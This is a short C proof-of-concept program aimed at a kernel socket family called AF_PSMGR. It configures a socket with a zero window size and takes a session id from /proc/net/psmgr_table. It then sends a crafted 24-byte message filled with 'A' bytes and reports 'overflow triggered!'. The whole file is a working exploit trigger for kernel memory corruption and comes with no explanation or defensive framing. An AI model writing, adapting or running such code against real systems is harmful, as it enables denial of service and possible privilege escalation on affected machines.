#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>

#define AF_PSMGR 46
#define PSMGR_SOL 282
#define PSMGR_OPT_SET_ROLE 1
#define PSMGR_OPT_LOCAL_CTX 4
#define PSMGR_ROLE_MANAGED 0x01
#define PSMGR_XFRM_WINDOW 0x02
#define PSMGR_MODE_LINEAR 0x01
#define PSMGR_MSG_DATA 0x05

struct psmgr_local_ctx { uint8_t xfrm_type; uint8_t enc_mode; uint16_t window_sz; uint32_t proc_param; };

int main(void) {
    int fd;
    struct psmgr_local_ctx ctx;
    uint8_t role = PSMGR_ROLE_MANAGED;
    uint8_t buf[24];
    ssize_t ret;
    FILE *f;
    char line[256];
    uint32_t session_id = 0;

    printf("step 1: socket\n"); fflush(stdout);
    fd = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd < 0) { printf("socket failed: %d %s\n", errno, strerror(errno)); return 1; }
    printf("socket ok fd=%d\n", fd); fflush(stdout);

    printf("step 2: set role MANAGED\n"); fflush(stdout);
    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role)) < 0) {
        printf("set_role failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    printf("set_role ok\n"); fflush(stdout);

    printf("step 3: set LOCAL_CTX\n"); fflush(stdout);
    memset(&ctx, 0, sizeof(ctx));
    ctx.xfrm_type = PSMGR_XFRM_WINDOW;
    ctx.enc_mode = PSMGR_MODE_LINEAR;
    ctx.window_sz = 0;
    ctx.proc_param = 127;
    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_LOCAL_CTX, &ctx, sizeof(ctx)) < 0) {
        printf("local_ctx failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    printf("local_ctx ok - ESTABLISHED\n"); fflush(stdout);

    /* Read session_id from /proc/net/psmgr_table */
    printf("step 4: reading /proc/net/psmgr_table\n"); fflush(stdout);
    f = fopen("/proc/net/psmgr_table", "r");
    if (f) {
        while (fgets(line, sizeof(line), f)) {
            printf("psmgr_table: %s", line);
            /* Parse session_id from first column */
            uint32_t sid;
            if (sscanf(line, "%u", &sid) == 1 && sid > 0) {
                session_id = sid;
            }
        }
        fclose(f);
    } else {
        printf("cannot open psmgr_table: %s\n", strerror(errno));
    }
    printf("using session_id=%u\n", session_id); fflush(stdout);

    printf("step 5: send DATA msg\n"); fflush(stdout);
    memset(buf, 0, sizeof(buf));
    buf[0] = PSMGR_MSG_DATA;
    buf[1] = session_id & 0xff;
    buf[2] = 16; buf[3] = 0;
    buf[4] = 1; buf[5] = 0; buf[6] = 0; buf[7] = 0;
    memset(buf + 8, 0x41, 16);

    ret = write(fd, buf, sizeof(buf));
    if (ret < 0) {
        printf("write failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    printf("write ok ret=%zd — overflow triggered!\n", ret); fflush(stdout);
    close(fd);
    return 0;
}

